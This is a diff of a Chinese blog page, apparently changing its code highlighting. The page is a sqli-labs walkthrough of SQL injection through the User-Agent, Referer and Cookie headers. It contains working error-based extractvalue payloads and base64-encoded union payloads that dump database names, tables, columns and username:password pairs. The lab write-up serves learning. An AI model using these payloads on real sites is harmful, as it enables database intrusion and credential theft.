@@ -6,7 +6,8 @@
     <meta charset="utf-8">
     <meta name="keywords" content="POST注入-HTTP头注入, 小白">
     <meta name="description" content="0x00原理：HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。
-$_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAME&amp;#x27;]  ">
+$_SERVER详解$_SERVER[&#39;SCRIPT_NAME&#39;]          //当前脚本的路径
+dirname($_SERVER[&#39;SCRIPT_NAME">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -492,20 +493,46 @@ $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAM
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。</p>
-<h3 id="SERVER详解"><a href="#SERVER详解" class="headerlink" title="$_SERVER详解"></a>$_SERVER详解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]          <span class="comment">//当前脚本的路径</span></span><br><span class="line">dirname(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]  <span class="comment">//dirname() 返回路径中的目录部分</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]      <span class="comment">//当前脚本执行的绝对路径</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]            <span class="comment">//获取当前域名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>]          <span class="comment">//输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SystemRoot&#x27;</span>]           <span class="comment">//当前服务器的操作系统的目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>]      <span class="comment">//服务器软件配置信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>]          <span class="comment">//服务器端口</span></span><br><span class="line"><span class="variable">$_SERVER</span> [<span class="string">&#x27;REMOTE_PORT&#x27;</span>]         <span class="comment">//用户连接到服务器时所使用的端口</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]          <span class="comment">//服务器的ip地址</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]          <span class="comment">//浏览网页的用户ip。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]        <span class="comment">//当前运行脚本所在的根目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_SCHEME&#x27;</span>]       <span class="comment">//服务器通信协议，是http或https。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADMIN&#x27;</span>]         <span class="comment">//服务器管理员信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]       <span class="comment">//请求数据的方式</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]          <span class="comment">//当前脚本路径，根目录之后的目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]             <span class="comment">//当前正在执行脚本的文件名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>]         <span class="comment">//得到请求开始时的时间戳。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_COOKIE&#x27;</span>]          <span class="comment">//获取浏览器的cookie信息。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CONNECTION&#x27;</span>]      <span class="comment">//当前请求的连接情况</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]      <span class="comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>]          <span class="comment">//当前请求的ACCEPT头部信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>] <span class="comment">//返回用户默认的语言设置，后面的q值表示用户对该语言的喜好程度</span></span><br></pre></td></tr></table></figure>
+<h3 id="SERVER详解"><a href="#SERVER详解" class="headerlink" title="$_SERVER详解"></a>$_SERVER详解</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_NAME'</span><span class="token punctuation">]</span>          <span class="token comment">//当前脚本的路径</span>
+<span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_NAME'</span><span class="token punctuation">]</span>  <span class="token comment">//dirname() 返回路径中的目录部分</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span>      <span class="token comment">//当前脚本执行的绝对路径</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span>            <span class="token comment">//获取当前域名</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span>          <span class="token comment">//输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SystemRoot'</span><span class="token punctuation">]</span>           <span class="token comment">//当前服务器的操作系统的目录</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_SOFTWARE'</span><span class="token punctuation">]</span>      <span class="token comment">//服务器软件配置信息</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_PORT'</span><span class="token punctuation">]</span>          <span class="token comment">//服务器端口</span>
+<span class="token variable">$_SERVER</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_PORT'</span><span class="token punctuation">]</span>         <span class="token comment">//用户连接到服务器时所使用的端口</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_ADDR'</span><span class="token punctuation">]</span>          <span class="token comment">//服务器的ip地址</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span>          <span class="token comment">//浏览网页的用户ip。</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span>        <span class="token comment">//当前运行脚本所在的根目录</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_SCHEME'</span><span class="token punctuation">]</span>       <span class="token comment">//服务器通信协议，是http或https。</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_ADMIN'</span><span class="token punctuation">]</span>         <span class="token comment">//服务器管理员信息</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span>       <span class="token comment">//请求数据的方式</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span>          <span class="token comment">//当前脚本路径，根目录之后的目录</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span>             <span class="token comment">//当前正在执行脚本的文件名</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_TIME'</span><span class="token punctuation">]</span>         <span class="token comment">//得到请求开始时的时间戳。</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_COOKIE'</span><span class="token punctuation">]</span>          <span class="token comment">//获取浏览器的cookie信息。</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CONNECTION'</span><span class="token punctuation">]</span>      <span class="token comment">//当前请求的连接情况</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span>      <span class="token comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_ACCEPT'</span><span class="token punctuation">]</span>          <span class="token comment">//当前请求的ACCEPT头部信息</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_ACCEPT_LANGUAGE'</span><span class="token punctuation">]</span> <span class="token comment">//返回用户默认的语言设置，后面的q值表示用户对该语言的喜好程度</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 <h2 id="0x01（useragent注入）"><a href="#0x01（useragent注入）" class="headerlink" title="0x01（useragent注入）"></a>0x01（useragent注入）</h2><p><strong>Less-18</strong></p>
 <p>查看源码可知有以下注意点：</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214039033.png" alt="image-20220205214039033"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]      <span class="comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]          <span class="comment">//浏览网页的用户ip。</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span>      <span class="token comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span>
+<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span>          <span class="token comment">//浏览网页的用户ip。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>由于对uname和passwd进行了check_input()函数处理，导致在这两个字段上注入时不行的：</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214350305.png" alt="image-20220205214350305"></p>
@@ -520,27 +547,27 @@ $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAM
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223005987.png" alt="image-20220205223005987"></p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223022658.png" alt="image-20220205223022658"></p>
 <h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>爆库：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223434243.png" alt="image-20220205223434243"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><code>and</code>前的<code>&#39;</code>是将<code>&#39;$uagent&#39;</code>中的前<code>&#39;</code>进行闭合，使用<code>or &#39;1&#39;=&#39;1</code>将<code>&#39;$uagent&#39;</code>后面的<code>&#39;</code>闭合；</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225102107.png" alt="image-20220205225102107"></p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225118423.png" alt="image-20220205225118423"></p>
 <h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>爆版本号：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select version()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select version()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225349977.png" alt="image-20220205225349977"></p>
 <h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>在爆表名的时候由于一个地方不知道什么原因试了很久，记录一下：</p>
 <p>这里一开始注入的是以下语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>页面没有爆出表；</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234603717.png" alt="image-20220205234603717"></p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234615471.png" alt="image-20220205234615471"></p>
 <p>当把<code>and</code>改成<code>or</code>才爆出表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234819705.png" alt="image-20220205234819705"></p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234826888.png" alt="image-20220205234826888"></p>
@@ -549,14 +576,14 @@ $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAM
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205235435928.png" alt="image-20220205235435928"></p>
 <p>空值和1<code>and</code>完之后为0，可能导致数据库不返回报错信息，导致没有爆出表名。</p>
 <h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>爆字段：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000302280.png" alt="image-20220206000302280"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000402501.png" alt="image-20220206000402501"></p>
 <h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>爆内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000602759.png" alt="image-20220206000602759"></p>
 <hr>
@@ -567,19 +594,19 @@ $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAM
 <h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>抓包后随便修改Referer值页面返回同样是修改后的内容：</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206223703891.png" alt="image-20220206223703891"></p>
 <h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>爆库名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206224350236.png" alt="image-20220206224350236"></p>
 <p>爆表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆字段：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &#x27; or extractvalue(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e)) and &#x27;1&#x27; =&#x27;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <hr>
 <h2 id="0x01（Cookie注入）"><a href="#0x01（Cookie注入）" class="headerlink" title="0x01（Cookie注入）"></a>0x01（Cookie注入）</h2><p><strong>Less-20</strong></p>
@@ -595,7 +622,7 @@ $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAM
 <p>该成GET方式提交回显正常：</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206232500745.png" alt="image-20220206232500745"></p>
 <p>爆库名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&#x27; or extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206232706475.png" alt="image-20220206232706475"></p>
 <p>后续过程与Less-19相同，同样也可以使用其他注入。</p>
@@ -609,23 +636,23 @@ $_SERVER详解1234567891011121314151617181920212223$_SERVER[&amp;#x27;SCRIPT_NAM
 <p><strong>这里还需注意一个点：此处的cookie值进行了<code>&#39;)</code>处理，导致开始注入的时候老是报语法错误。</strong></p>
 <h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>先抓包，然后进行<code>cookie</code>加密注入：</p>
 <p>探测一下字段数，有3个字段：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4nKSBvcmRlciBieSA0Iw==</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;YWRtaW4nKSBvcmRlciBieSA0Iw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207001749683.png" alt="image-20220207001749683"></p>
 <p>联合注入爆库，爆版本号：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkj</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkj<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002221359.png" alt="image-20220207002221359"></p>
 <p>爆表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw==</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002533567.png" alt="image-20220207002533567"></p>
 <p>爆字段：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw==</span><br></pre></td></tr></table></figure>
